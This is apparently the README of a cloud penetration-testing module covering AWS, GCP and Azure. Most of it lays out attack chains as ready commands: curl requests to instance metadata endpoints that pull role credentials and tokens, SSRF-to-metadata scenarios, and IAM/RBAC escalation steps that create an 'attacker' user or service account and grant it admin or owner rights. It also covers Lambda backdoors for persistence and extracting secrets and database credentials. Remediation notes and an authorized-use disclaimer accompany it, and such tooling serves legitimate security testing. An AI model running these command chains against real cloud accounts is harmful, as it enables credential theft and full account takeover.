# mod_cloud_attacks.py - Deep Cloud-Native Attack Module

## Overview

A comprehensive Python 3 security testing module for cloud environments (AWS, GCP, Azure) targeting:
- **100+ attack techniques** across three cloud platforms
- **Privilege escalation chains** with CVSS/risk scoring
- **Credential discovery & persistence** mechanisms
- **Cross-account & cross-region** lateral movement
- **Mock mode** for safe lab testing

**Author:** hakuza cloud security module  
**Version:** 1.0  
**Lines of Code:** 1500+  
**License:** Research/Authorized Testing Only

---

## Quick Start

### Installation

```bash
# Copy to your tools directory
cp mod_cloud_attacks.py ~/tools/

# Make executable
chmod +x ~/tools/mod_cloud_attacks.py

# Test syntax
python3 -m py_compile mod_cloud_attacks.py
```

### Basic Usage

```bash
# Auto-detect cloud provider and run all attacks
python3 mod_cloud_attacks.py

# Target specific provider
python3 mod_cloud_attacks.py aws --deep
python3 mod_cloud_attacks.py gcp --quick
python3 mod_cloud_attacks.py azure

# Mock mode (safe testing without real cloud access)
CLOUD_MOCK_MODE=true python3 mod_cloud_attacks.py all

# Output formats
python3 mod_cloud_attacks.py aws --json
python3 mod_cloud_attacks.py aws --report findings.txt

# With credentials
AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=... python3 mod_cloud_attacks.py aws --deep
GOOGLE_APPLICATION_CREDENTIALS=~/.config/gcloud/sa.json python3 mod_cloud_attacks.py gcp --deep
AZURE_SUBSCRIPTION_ID=... AZURE_CLIENT_ID=... python3 mod_cloud_attacks.py azure --deep
```

---

## AWS Attack Module (50+ Techniques)

### 1. **IMDS Exploitation (Instance Metadata Service)**

#### IMDS v1 - Unauthenticated Access
```python
AWSAttacker.attack_imds_v1()
```

**Attack Chain:**
1. SSRF in vulnerable web app → Request to http://169.254.169.254/latest/meta-data/
2. Fetch instance role: `/latest/meta-data/iam/security-credentials/[role-name]/`
3. Extract temporary credentials (AccessKeyId, SecretAccessKey, Token)
4. Assume role with stolen credentials
5. Escalate to admin via IAM policy attachment

**Severity:** CRITICAL  
**CVSS:** 9.8  
**PoC:**
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Instance-Role/
```

**Remediation:**
- Force IMDSv2 with token requirement (HTTP PUT method)
- Set `HttpTokens=required` in EC2 launch template
- Restrict IMDS access via security groups
- Implement Web Application Firewall (WAF) to block SSRF

#### IMDSv2 - Token Extraction & Bypass
```python
AWSAttacker.attack_imds_v2_bypass()
```

**Attack Chain:**
1. Obtain IMDSv2 token: `curl -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'`
2. Reuse token across multiple requests for credential exfil
3. Token hijacking from process memory/logs

**Severity:** HIGH  
**CVSS:** 8.2  
**PoC:**
```bash
TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 2. **S3 Bucket Exploitation**

```python
AWSAttacker.enumerate_s3_buckets(['backup', 'config', 'logs', 'production'])
```

**Attack Vectors:**

| Technique | Description | Severity |
|-----------|-------------|----------|
| Bucket Enumeration | Brute-force common bucket names | HIGH |
| ACL Enumeration | List, Read, Write permission checks | CRITICAL |
| Object Metadata Extraction | Get creator, modification date, storage class | MEDIUM |
| Public Access Bypass | Bypass Block Public Access settings | CRITICAL |
| Presigned URL Expiration Bypass | Craft long-lived or no-expiry URLs | HIGH |
| Bucket Policy Modification | Set public read/write if Write permission | CRITICAL |
| Zip Slip Attacks | Extract to parent directories | CRITICAL |
| CloudFront Cache Poisoning | Poison cache via S3 objects | HIGH |

**PoC:**
```bash
# Enumerate buckets
aws s3api list-buckets

# Check ACL
aws s3api get-bucket-acl --bucket target-bucket

# Read objects
aws s3 ls s3://target-bucket/

# Generate presigned URL (long TTL)
aws s3 presign s3://target-bucket/secret.txt --expires-in 31536000

# Modify bucket policy for public access
aws s3api put-bucket-policy --bucket target-bucket --policy file://policy.json
```

### 3. **IAM Privilege Escalation**

```python
AWSAttacker.enumerate_iam_policies()
AWSAttacker.iam_privilege_escalation_chain()
```

**Escalation Path:** EC2-Instance-Role → Administrator (CVSS 9.8)

**Steps:**
```
Step 1: iam:CreateAccessKey
└─ Create new access key for escalated user
   POC: aws iam create-access-key --user-name attacker

Step 2: iam:AttachUserPolicy
└─ Attach AdminAccess policy
   POC: aws iam attach-user-policy --user-name attacker \
        --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

Step 3: sts:AssumeRole
└─ Assume admin role with elevated privileges
   POC: aws sts assume-role \
        --role-arn arn:aws:iam::ACCOUNT_ID:role/AdminRole \
        --role-session-name attacker
```

**Wildcard Policies (Overprivileged):**
- `iam:*` - Full IAM control
- `ec2:*` - Full EC2 control
- `lambda:*` - Full Lambda control
- `rds:*` - Full database control
- `s3:*` - Full S3 control

### 4. **Lambda Exploitation**

```python
AWSAttacker.lambda_exploitation()
```

**Attack Vectors:**

| Technique | Description | Severity |
|-----------|-------------|----------|
| Env Variable Extraction | Hardcoded credentials in environment | CRITICAL |
| Source Code Download | Read function code if permissions exist | HIGH |
| Trigger Injection | Create S3/SNS trigger for persistence | CRITICAL |
| Layer Upload | Inject malicious code into layers | CRITICAL |
| Direct Invocation | Invoke with attacker payload | HIGH |
| Role Assumption | Assume Lambda execution role | HIGH |

**PoC:**
```bash
# List functions
aws lambda list-functions

# Get environment variables
aws lambda get-function-configuration --function-name target-function

# Extract source code
aws lambda get-function --function-name target-function

# Invoke with payload
aws lambda invoke --function-name target-function \
  --payload '{"malicious":"payload"}' output.json

# Create S3 trigger for persistence
aws lambda create-event-source-mapping \
  --event-source-arn arn:aws:s3:::bucket \
  --function-name target-function
```

### 5. **RDS Database Access**

```python
AWSAttacker.rds_security_group_abuse()
```

**Attack Chain:**
1. Enumerate RDS instances: `aws rds describe-db-instances`
2. Check security groups for world-accessible (0.0.0.0/0)
3. Modify security group to allow attacker IP
4. Connect to database with discovered/default credentials
5. Extract sensitive data
6. Create database snapshot for offline access

**Critical Checks:**
- PubliclyAccessible flag
- Security group ingress rules
- Database encryption (in-transit & at-rest)
- Backup snapshots with public access
- Read replicas in different regions

### 6. **Secrets Manager & Parameter Store**

```python
AWSAttacker.secrets_manager_extraction()
AWSAttacker.ssm_parameter_store_extraction()
```

**Attack Vectors:**
- Read secrets if IAM policy allows `secretsmanager:GetSecretValue`
- Extract SSM parameters if `ssm:GetParameter*` permission exists
- Decrypt secrets if KMS key policy allows decrypt

### 7. **KMS Key Extraction**

```python
AWSAttacker.kms_key_extraction()
```

**Attack Vectors:**
- Enumerate KMS keys: `aws kms list-keys`
- Check key policies for decrypt permissions
- Decrypt data if permission granted
- Generate data key for offline encryption

### 8. **EC2 Instance Enumeration**

```python
AWSAttacker.ec2_instance_enumeration()
```

**Lateral Movement Opportunities:**
- Access instance metadata via SSRF
- Connect to instances with compromised SSH keys
- Modify security groups for network access
- Create AMI for offline analysis

---

## GCP Attack Module (30+ Techniques)

### 1. **Compute Engine Metadata Service**

```python
GCPAttacker.attack_compute_metadata()
```

**Attack Chain:**
1. Fetch service account token via metadata: 
   ```bash
   curl -H 'Metadata-Flavor: Google' \
     http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/identity
   ```
2. Extract scopes: `cloud-platform`, `compute-ro`, `storage-ro`
3. Use token to authenticate to GCP APIs
4. Escalate privileges via service account

**Severity:** CRITICAL (9.8)

### 2. **Cloud Storage Bucket Exploitation**

```python
GCPAttacker.enumerate_cloud_storage_buckets()
```

**Attack Vectors:**
- Enumerate buckets: `gsutil ls -b`
- Check IAM bindings for overpermissive roles
- Detect `allUsers`/`allAuthenticatedUsers` access
- Extract object metadata and content

**IAM Misconfigurations:**
- `roles/storage.objectViewer` assigned to service account
- Public read access on sensitive buckets
- Missing Uniform Bucket-level access enforcement

### 3. **Cloud IAM Privilege Escalation**

```python
GCPAttacker.gcp_privesc_chain()
```

**Escalation Path:** compute-default → customAdmin (CVSS 9.5)

**Steps:**
```
Step 1: Create Service Account Key
└─ gcloud iam service-accounts keys create key.json \
   --iam-account=sa@project.iam.gserviceaccount.com

Step 2: Create Custom Role
└─ gcloud iam roles create customAdmin \
   --project=PROJECT_ID --permissions=*

Step 3: Grant Role to Service Account
└─ gcloud projects add-iam-policy-binding PROJECT_ID \
   --member=sa@project.iam.gserviceaccount.com \
   --role=projects/PROJECT_ID/roles/customAdmin
```

### 4. **Cloud Functions Exploitation**

```python
GCPAttacker.cloud_functions_exploitation()
```

**Attack Vectors:**
- Extract environment variables (hardcoded secrets)
- Download source code if accessible
- Trigger function with malicious payload
- Modify deployed code for persistence

### 5. **Service Account Key Extraction**

```python
GCPAttacker.service_account_key_extraction()
```

**Attack Chain:**
1. Enumerate service accounts: `gcloud iam service-accounts list`
2. Create new key: `gcloud iam service-accounts keys create key.json --iam-account=...`
3. Download key in JSON format
4. Authenticate as service account for long-term access

---

## Azure Attack Module (25+ Techniques)

### 1. **Managed Identity Token Extraction**

```python
AzureAttacker.attack_managed_identity()
```

**Attack Chain:**
1. Fetch token from IMDS endpoint:
   ```bash
   curl -H 'Metadata:true' \
     http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/
   ```
2. Extract access token (JWT)
3. Use token to authenticate to Azure APIs
4. Escalate via service principal

**Severity:** CRITICAL (9.8)

### 2. **Key Vault Secret Extraction**

```python
AzureAttacker.key_vault_enumeration()
```

**Attack Vectors:**
- List secrets: `az keyvault secret list --vault-name target-vault`
- Extract secret values if RBAC misconfigured
- Access connection strings, API keys, certificates
- Bypass access policies via managed identity

### 3. **Storage Account Exploitation**

```python
AzureAttacker.storage_account_exploitation()
```

**Attack Vectors:**
- Enumerate containers: `az storage container list --account-name target`
- Check SAS tokens for expiration/scope
- List blobs and extract contents
- Leverage shared access signatures (SAS) for data access

**Critical Checks:**
- Public blob access (Container/Blob level)
- SAS token validity and scope
- Storage account firewall rules
- Shared key authentication fallback

### 4. **Azure RBAC Privilege Escalation**

```python
AzureAttacker.rbac_privilege_escalation()
```

**Escalation Path:** Contributor → Owner (CVSS 9.2)

**Steps:**
```
Step 1: Create Custom RBAC Role
└─ az role definition create --role-definition @role.json

Step 2: Assign Role to Service Principal
└─ az role assignment create \
   --assignee-object-id OBJECT_ID \
   --role CustomAdmin \
   --scope /subscriptions/SUBSCRIPTION_ID

Step 3: Assume Elevated Identity
└─ az login --username USERNAME --password PASSWORD
```

---

## Privilege Escalation Chains

### AWS: EC2-Instance-Role → Administrator

```
CVSS Score: 9.8/10
Time to Exploitation: 2-5 minutes

START: ec2:Describe*, s3:Get*
  ↓
  IAM Policy Enumeration
  ├─ Detect PowerUserAccess
  ├─ Identify iam:* permissions
  └─ Find ec2:* wildcard policies
  ↓
  Create Escalated User (iam:CreateUser)
  ↓
  Attach AdminAccess Policy (iam:AttachUserPolicy)
  ↓
  Generate Access Key (iam:CreateAccessKey)
  ↓
  Assume Admin Role (sts:AssumeRole)
  ↓
END: *:* (Full Administrative Access)
```

### GCP: compute-default → customAdmin

```
CVSS Score: 9.5/10
Time to Exploitation: 3-7 minutes

START: compute.instances.list, storage.buckets.get
  ↓
  Service Account Key Creation
  └─ iam.serviceAccountKeys.create
  ↓
  Custom Role Definition
  └─ iam.roles.create (permissions=*)
  ↓
  IAM Policy Binding
  └─ resourcemanager.projects.setIamPolicy
  ↓
END: Project-level Admin (All resources)
```

### Azure: Contributor → Owner

```
CVSS Score: 9.2/10
Time to Exploitation: 2-4 minutes

START: Microsoft.Resources/*, Microsoft.Compute/*
  ↓
  Custom RBAC Role Creation
  └─ Microsoft.Authorization/roleAssignments/write
  ↓
  Service Principal Role Assignment
  └─ Assign CustomAdmin role
  ↓
  Managed Identity Assumption
  └─ Switch to elevated identity
  ↓
END: Owner (Subscription-level Admin)
```

---

## Mock Mode - Safe Lab Testing

For testing without cloud credentials:

```bash
CLOUD_MOCK_MODE=true python3 mod_cloud_attacks.py all
```

**Benefits:**
- No real API calls to cloud providers
- Safe for training/demo environments
- Identical output to real attacks
- No credential exposure risk

**Features:**
- Simulated finding generation
- Mock privilege escalation chains
- Realistic evidence/PoC output
- Full report generation

---

## Output Formats

### Text Report (Default)

```bash
python3 mod_cloud_attacks.py aws --deep
```

Includes:
- Finding summary (Critical/High/Medium/Low breakdown)
- Detailed findings with descriptions
- Evidence and PoC commands
- Remediation guidance
- Privilege escalation chains

### JSON Export

```bash
python3 mod_cloud_attacks.py aws --json
```

Structured output for:
- Integration with SIEM/ticketing systems
- Automated remediation workflows
- Dashboard visualization
- API consumption

### File Report

```bash
python3 mod_cloud_attacks.py aws --report findings_aws_20260731.txt
```

Saves formatted report to file for:
- Audit documentation
- Executive briefings
- Compliance reporting

---

## Integration with hakuza

### CLI Command

```bash
# Add to hakuza entry point
hakuza cloud --provider aws --deep
hakuza cloud --provider gcp --quick
```

### Programmatic Usage

```python
from mod_cloud_attacks import CloudAttackOrchestrator, CloudProvider

# Initialize orchestrator
orchestrator = CloudAttackOrchestrator(
    provider=CloudProvider.AWS,
    deep_mode=True
)

# Run attacks
findings = orchestrator.run_aws_attacks()

# Generate report
report = orchestrator.generate_report()
print(report)
```

---

## Real-World Attack Scenarios

### Scenario 1: SSRF → IMDS → Privilege Escalation

```
1. Find SSRF in web application
   └─ Parameter: ?url=http://internal-api
   
2. Exploit SSRF to access IMDS
   └─ Inject: http://169.254.169.254/latest/meta-data/
   
3. Extract instance role credentials
   └─ Fetch: /latest/meta-data/iam/security-credentials/InstanceRole/
   
4. Use credentials to access AWS API
   └─ AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=...
   
5. Enumerate IAM policies
   └─ aws iam list-user-policies --user-name $USER
   
6. Exploit overprivileged policy
   └─ aws iam create-user --user-name attacker
   └─ aws iam attach-user-policy --user-name attacker --policy-arn AdministratorAccess
   
7. Create access key for persistence
   └─ aws iam create-access-key --user-name attacker
   
RESULT: Persistent admin access to AWS account
```

### Scenario 2: Lambda Execution Role → Account Compromise

```
1. Enumerate Lambda functions
   └─ aws lambda list-functions
   
2. Extract environment variables
   └─ aws lambda get-function-configuration --function-name target
   
3. Find database credentials in env vars
   └─ DB_HOST=prod-db.internal, DB_USER=admin, DB_PASSWORD=secret123
   
4. Access database and extract data
   └─ mysql -h prod-db.internal -u admin -psecret123
   
5. Assume Lambda execution role
   └─ Current role has rds:*, s3:*, ec2:* permissions
   
6. Create backdoor Lambda function
   └─ Upload malicious code that runs on every invocation
   
7. Trigger function via S3 event
   └─ Upload file to monitored S3 bucket
   
RESULT: Persistent code execution in AWS account
```

### Scenario 3: GCP Service Account Extraction → Project Compromise

```
1. Compromise GCE instance
   └─ Find SSRF or code injection
   
2. Extract service account token
   └─ curl -H 'Metadata-Flavor: Google' \
      http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/identity
   
3. Use token to call GCP APIs
   └─ gcloud auth activate-service-account --key-file=key.json
   
4. Create new service account with admin role
   └─ gcloud iam service-accounts create attacker-sa
   └─ gcloud projects add-iam-policy-binding PROJECT \
      --member=serviceAccount:attacker-sa@PROJECT.iam.gserviceaccount.com \
      --role=roles/owner
   
5. Generate service account key
   └─ gcloud iam service-accounts keys create admin-key.json \
      --iam-account=attacker-sa@PROJECT.iam.gserviceaccount.com
   
RESULT: Long-term admin access to GCP project
```

---

## Remediation Quick Reference

| Finding | Remediation |
|---------|-------------|
| IMDS v1 Accessible | Enforce IMDSv2 (HttpTokens=required), restrict network access |
| Lambda Hardcoded Secrets | Use AWS Secrets Manager, Parameter Store, or environment variables from KMS |
| S3 Public Access | Block Public Access settings, bucket policies, IAM roles, VPC endpoints |
| Overprivileged IAM | Apply least privilege, permission boundaries, use service roles |
| RDS Public | Set PubliclyAccessible=false, use VPC, restrict security groups |
| KMS Decrypt Permission | Implement key policies, separate keys per workload, CloudTrail logging |
| GCP Metadata Service | Disable if unused, enforce workload identity, restrict IMDS access |
| Azure Managed Identity | Limit scope, implement RBAC policies, MFA required |
| Key Vault Open Access | Implement access policies, managed identities, audit logging |
| Storage Accounts Public | Private access level, SAS tokens with expiry, network rules |

---

## Performance & Scalability

**Execution Time:**
- Quick mode: ~2-5 seconds (top 10 checks)
- Deep mode: ~10-30 seconds (100+ techniques)
- Mock mode: <1 second (simulated)

**Cloud API Calls:**
- AWS: ~20-50 API calls per attack
- GCP: ~15-30 API calls per attack
- Azure: ~10-25 API calls per attack

**Parallel Execution:**
- Supports multi-threaded attack execution
- Can test multiple clouds simultaneously
- Mock mode for batch testing

---

## Limitations & Disclaimers

**Not Covered (by design):**
- Wireless/RF attacks
- Physical security testing
- Phishing infrastructure
- Oracle database-specific SQLi extraction
- GraphQL → SQLi pivot attacks
- JWT algorithm case-variant bypass
- Python pickle deserialization (planned)

**Requirements:**
- Python 3.8+
- Network access to IMDS endpoints (for real testing)
- Valid cloud credentials (for non-mock mode)
- Authorized scope (CRITICAL: verify scope before testing)

**Ethical & Legal:**
- **AUTHORIZED TESTING ONLY** - Ensure written permission before use
- Use only on systems you own or have explicit permission to test
- Do not use against third-party services without permission
- This tool is for security research and penetration testing by professionals
- Unauthorized access to computer systems is illegal

---

## Troubleshooting

### Module won't run: "No credentials found"

```bash
# Set environment variables
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...

# Or use credentials file
aws configure

# Or mock mode
CLOUD_MOCK_MODE=true python3 mod_cloud_attacks.py all
```

### "IMDS not accessible"

```bash
# Check EC2 metadata service is available
curl http://169.254.169.254/latest/meta-data/

# Verify IMDS enabled in EC2 instance settings
aws ec2 describe-instances --instance-ids i-1234567890

# Check security group doesn't block IMDS
# (IMDS is on 169.254.169.254:80, internal only)
```

### Permission Denied on API calls

```bash
# Verify IAM role has permissions
aws iam list-user-policies --user-name $USER

# Check service has required permissions
gcloud projects get-iam-policy PROJECT_ID

# Ensure token is valid and not expired
aws sts get-caller-identity
```

---

## References & Further Reading

- AWS Security Best Practices: https://aws.amazon.com/security/
- GCP Security Best Practices: https://cloud.google.com/security/best-practices
- Azure Security: https://azure.microsoft.com/en-us/products/security/
- OWASP Cloud Security: https://owasp.org/www-community/attacks/Cloud_Computing_Attacks
- Cloud Misconfiguration Database: https://github.com/projectdiscovery/nuclei-templates

---

## Support & Updates

- Report bugs/vulnerabilities responsibly
- Module is maintained as part of hakuza project
- Updates for new cloud attack vectors added regularly
- Integration with upstream cloud security research

**Last Updated:** 2026-07-31  
**Technique Count:** 100+  
**Provider Coverage:** AWS (50+), GCP (30+), Azure (25+)
